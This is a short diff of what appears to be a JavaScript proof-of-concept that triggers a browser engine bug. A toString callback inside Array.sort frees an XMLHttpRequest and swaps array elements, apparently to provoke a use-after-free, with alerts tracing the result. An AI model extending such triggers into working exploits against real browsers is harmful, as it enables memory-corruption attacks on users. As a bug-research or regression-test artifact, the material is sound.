@@ -16,14 +16,14 @@ function sleep(d){
   for(var t = Date.now();Date.now() - t <= d;);
 }
 
-var c = new Array(0x1000)
+var c = new Array(0x100000)
 var b = new XMLHttpRequest()
 var a = [1,{toString:function(){
  a[2] = {};
  b = null
  //for(var i=0;i<0x10;i++){
  alert("before gc");
- gc();
+// gc();
  alert("after gc");
  //}
  //sleep(1000)
@@ -38,7 +38,7 @@ a.sort();
 try{
 alert(a[0]);
 alert(a[1]);
-//alert(a[2]);
+alert(a[2]);
 alert(a[3]);
 }catch(e){
 alert(e);
